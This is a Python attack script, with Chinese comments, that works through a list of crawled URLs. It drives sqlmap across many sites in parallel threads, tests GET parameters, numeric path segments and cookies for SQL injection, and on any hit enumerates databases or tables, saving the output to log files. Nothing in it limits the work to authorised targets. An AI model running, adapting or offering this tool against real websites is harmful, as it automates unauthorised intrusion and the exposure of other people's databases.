import threading, queue
import re, time, requests, os, lockfile
from requests.packages import urllib3
urllib3.disable_warnings()

class sql_injcetion(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue = queue

    def save(self, command, info):
        global filename
        
        with open(filename.replace('link','sql_info'),'ab')as f, open(filename.replace('link','sql_crash'),'ab')as f1:
            file_lock = lockfile.MkdirFileLock(filename.replace('link','sql_info'))    
            while(1):
                try:
                    file_lock.acquire()
                except:
                    time.sleep(0.1)
                else:
                    break
            f.write(bytes((r'D:\>'+command).replace('\n', ''), encoding='utf-8'))
            f.write(bytes(info, encoding='utf-8'))
            file_lock.release()

            file_lock = lockfile.MkdirFileLock(filename.replace('link','sql_crash'))    
            while(1):
                try:
                    file_lock.acquire()
                except:
                    time.sleep(0.1)
                else:
                    break
            f1.write(bytes(command +'\r\n',encoding='utf-8'))
            file_lock.release()

    def lock_file(self,filename,text):
        with open(filename,'a',encoding='utf-8')as f:
            file_lock = lockfile.MkdirFileLock(filename)    
            while(1):
                try:
                    file_lock.acquire()
                except:
                    time.sleep(0.1)
                else:
                    break
            f.write(text)
            file_lock.release()
            
    def run(self):
        global filename, pass_len, task_len
        while  not self._queue.empty():
            url = self._queue.get().strip()
            pass_len = pass_len + 1

            try:
                code=requests.get(url).status_code
                
            except:
                self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')

            else:                
                if code ==200:
                    position = [i.start() for i in re.finditer('/', url)]
                    site = url[:position[2]]
                    path = url[position[2]:]
                    old_path = path
                    strlist = re.split('\.|\/|\:|\?|=|\&',path)
                    path_position = [i.start() for i in re.finditer('\.|\/|\:|\?|=|\&', path)]
                    
                    if not(re.findall('\?(.*?)=',path)):
                            #伪静态加*
                        for i in range(0,len(strlist)):
                            if len([i.start() for i in re.finditer('\d', strlist[i])])==len(strlist[i]) and strlist[i]:
                                strlist[i] = strlist[i] + '*'

                        path = ''
                        for i in range(0,len(path_position)):
                            path = path + strlist[0] + old_path[path_position[i]]
                            strlist.pop(0)
                        if strlist:
                            path = path + strlist[0]
                            
                        url = site + path
                                    
                        command = 'sqlmap.py --batch -u "' + url + '"'
                        info = os.popen(command).read()

                        if ('might be injectable' in info) or ('the back-end DBMS is' in info) or ('the back-end DBMS could be' in info):
                            if 'the back-end DBMS is Microsoft Access' in info:
                                command = 'sqlmap.py --batch -u "' + url + '" --tables'
                                info = os.popen(command).read()

                                self.save(command, info)
                                self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')
                                continue
##                                if 'no table(s) found' in info:
##                                    continue
##                                else:
##                                    self.save(command, info)
                            else:
                                command = 'sqlmap.py --batch -u "' + url + '" --dbs'
                                info = os.popen(command).read()

                                self.save(command, info)
                                self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')
                                continue
##                                if 'does not seem to be injectable' in info:
##                                    continue
##                                else:
##                                    self.save(command, info)
                        else:
                            self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')
                            continue
                    
                    if re.findall('\?(.*?)=',url):
                        
                        get_command = 'sqlmap.py --batch -u "' + url + '"'
                        get_info = os.popen(get_command).read() #执行该命令#读取命令行的输出到一个list
##                        print(get_info)
                                
                        if ('might be injectable' in get_info) or ('the back-end DBMS is'in get_info):
                            if 'the back-end DBMS is Microsoft Access' in get_info:
                                command = 'sqlmap.py --batch -u "' + url + '" --tables'
                                info = os.popen(command).read()

                                self.save(command, info)
                                self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')
                                continue
##                                if 'no table(s) found' in info:
##                                    continue
##                                else:
##                                    self.save(command, info)
                            else:
                                command = 'sqlmap.py --batch -u "' + url + '" --dbs'
                                info = os.popen(command).read()

                                self.save(command, info)
                                self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')
                                continue
##                                if 'does not seem to be injectable' in info:
##                                    continue
##                                else:
##                                    self.save(command, info)
##                                    continue

                        cookie_command = 'sqlmap.py --batch -u ' + url.split('?',1)[0] + ' --cookie="' + url.split('?',1)[1] + '" --level=2'
                        cookie_info = os.popen(cookie_command).read()
                        
                        if ('might be injectable' in cookie_info) or ('the back-end DBMS is' in cookie_info):
                            if 'the back-end DBMS is Microsoft Access' in cookie_info:
                                command = 'sqlmap.py --batch -u ' + url.split('?',1)[0] + ' --cookie="' + url.split('?',1)[1] + '" --level=2 --tables'
                                info = os.popen(command).read()

                                self.save(command, info)
                                self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')
                                continue
##                                if 'no table(s) found' in info:
##                                    continue
##                                else:
##                                    self.save(command, info)

                            else:
                                command = 'sqlmap.py --batch -u ' + url.split('?',1)[0] + ' --cookie="' + url.split('?',1)[1] + '" --level=2 --dbs'
                                info = os.popen(command).read()

                                self.save(command, info)
                                self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')
                                continue
##                                if 'does not seem to be injectable' in info:
##                                    continue
##                                else:
##                                    self.save(command, info)
                        else:
                            self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')
                else:
                    self.lock_file(filename.replace('link','sql_test_pass'),url+'\n')
                    
            print('任务进度：'+str(pass_len)+'/'+str(task_len)+' '+str(int(pass_len/task_len*10000)/100)+'%')
                    
def clear():
    with open(filename,'r',encoding='utf-8-sig') as f1,open(filename.replace('link','sql_test'),'w',encoding='utf-8') as f3:
        regex_list = []
        site_list = {}

        for craw_context in f1:
            craw_context = craw_context.lower().strip()
                        
            position = [i.start() for i in re.finditer('/', craw_context)]
            if len(position) >2:
                path = craw_context[position[2]:]
                numbers = [i.start() for i in re.finditer('\d', path)]
                strlist = re.split('\.|\/|\:|\?|=|\&',path)
                if numbers:
                            
                    if not(re.findall('\?(.*?)=',path)):
                            #伪静态加*
                        for i in strlist:
                            if len([i.start() for i in re.finditer('\d', i)])==len(i) and i:
                                break
                    
                    craw_context_regex = craw_context
                    value = [i.start() for i in re.finditer('=', craw_context_regex)]

                    if value:
                        
                        value1 = [i.start() for i in re.finditer('\.|\/|\:|\?|\&', craw_context_regex)]
                        
                        if value1[-1] < value[-1]:
                            craw_context_regex = craw_context_regex[:value[-1]+1]
                                                                                                                                                            
                        for i in reversed(value):
                            for j in value1:
                                if j > i:
                                    craw_context_regex = craw_context_regex[0:i+1] + craw_context_regex[j:]
                                    break
                    
                    for i in strlist:
                        if len(i)>20:
                            craw_context_regex=craw_context_regex.replace(i,'')

                    regex = craw_context[0:position[2]] + re.sub(r'([\d]+)','',craw_context_regex[position[2]:len(craw_context_regex)])
                    
                    if regex in regex_list:
                        continue                    
                    else:
                        site = craw_context.split('/')[2]
                        if site in site_list:
                            if site_list[site]<5:
                                site_list[site] += 1
                            else:
                                continue
                        else:
                            site_list[site] = 1
                            
                        regex_list.append(regex)
                        f3.write(craw_context+'\n')
                    

    print('链接去重完毕,共 ' + str(len(regex_list)) + ' 条')

def main():
    global pass_len, task_len

    if not os.path.isfile(filename.replace('link','sql_test')):
        clear()
    
    context_list = []
    threads = []
    Queue = queue.Queue()

    with open(filename.replace('link','sql_test_pass'),'r',encoding='utf-8')as f:
        pass_list = f.readlines()
        pass_len = len(set(pass_list))
        
    with open(filename.replace('link','sql_test'),'r',encoding='utf-8')as f:
        task_list_all = f.readlines()
        task_len = len(set(task_list_all))
        
    task_list = list(set(task_list_all) - set(pass_list))
    
    print('任务进度：'+str(pass_len)+'/'+str(task_len)+' '+str(int(pass_len/task_len*10000)/100)+'%')
                
    start_time = time.clock()
    for i in task_list:
        Queue.put(i)

    for i in range(threads_count):
        threads.append(sql_injcetion(Queue))	
    for i in threads:
        i.start()
    for i in threads:
        i.join()

    print('任务进度：'+str(pass_len)+'/'+str(task_len)+' '+str(int(pass_len/task_len*10000)/100)+'%')
    return start_time

if __name__ == '__main__':
    threads_count = 10
    filename = 'output/url/url_link.txt'

    start_time = main()
    
    end_time = time.clock()
    print ("Cost time is %f" % (end_time - start_time))
